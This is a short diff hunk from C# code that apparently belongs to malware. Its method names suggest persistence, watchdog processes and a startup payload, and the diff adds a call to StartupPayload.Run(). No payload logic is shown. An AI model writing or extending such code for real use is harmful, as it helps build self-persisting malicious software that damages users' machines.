@@ -68,6 +68,7 @@ namespace ëntärtäïnër
                     Persistence.Persist();
                     WatchDog.CreateWDs();
                     //Block
+                    StartupPayload.Run();
                     Nagila2Thread.Run();
                 }
                 finally
